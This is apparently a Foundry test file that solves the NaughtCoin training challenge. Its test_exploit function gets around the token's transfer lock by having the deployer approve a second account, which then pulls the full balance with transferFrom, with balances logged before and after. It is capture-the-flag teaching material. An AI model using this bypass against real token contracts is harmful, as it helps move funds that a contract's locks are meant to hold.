// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/NaughtCoin.sol";

import "forge-std/Test.sol";
import "forge-std/console.sol";


contract NaughtCoinTest is Test {
    NaughtCoin naughtCoin;

    address deployer = makeAddr("deployer");
    address secondAc = makeAddr("secondAc");

    function setUp() public {
        vm.prank(deployer);
        naughtCoin = new NaughtCoin(deployer);
    }

    function test_exploit() public {
        console.log("Before Exploit");
        console.log("Deployer balance: ",naughtCoin.balanceOf(deployer));
        console.log("Second AC balance: ",naughtCoin.balanceOf(secondAc));
        uint256 deployerBalance = naughtCoin.balanceOf(deployer);
        vm.startPrank(deployer);
        naughtCoin.approve(secondAc,deployerBalance);
        vm.stopPrank();
        console.log("allowed tokens: ", naughtCoin.allowance(deployer,secondAc));
        vm.prank(secondAc);
        naughtCoin.transferFrom(deployer, secondAc, deployerBalance);
        console.log("After Exploit");
        console.log("Deployer balance: ",naughtCoin.balanceOf(deployer));
        console.log("Second AC balance: ",naughtCoin.balanceOf(secondAc));
        

        
            

    }
}